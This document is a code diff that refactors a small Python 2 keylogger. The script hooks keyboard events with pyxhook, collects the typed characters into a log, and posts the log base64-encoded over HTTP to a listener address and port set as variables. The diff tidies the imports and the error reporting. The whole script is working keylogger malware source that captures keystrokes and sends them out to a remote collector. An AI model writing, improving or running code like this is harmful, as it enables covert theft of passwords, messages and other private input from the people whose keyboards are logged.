@@ -1,8 +1,9 @@
 #!/usr/bin/env python2
 
-import requests
-import pyxhook
 import base64
+import pyxhook
+from requests import post
+import urllib3
 
 IP = "127.0.0.1"
 PORT = "2000"
@@ -16,11 +17,11 @@ if __name__ == '__main__':
         if len(log) >= line_counter:
             try:
                 print "sending..."
-                r = requests.post("http://" + IP + ":" + PORT + "/", data=base64.b64encode(log))
+                post("http://" + IP + ":" + PORT + "/", data=base64.b64encode(log))
                 log = ""
                 line_counter = 50
-            except:
-                print "Failed..."
+            except Exception as e:
+                print "Failed..." + str(e)
                 line_counter += 50
         if event.Ascii > 31 and event.Ascii < 126:
             log += chr(event.Ascii)
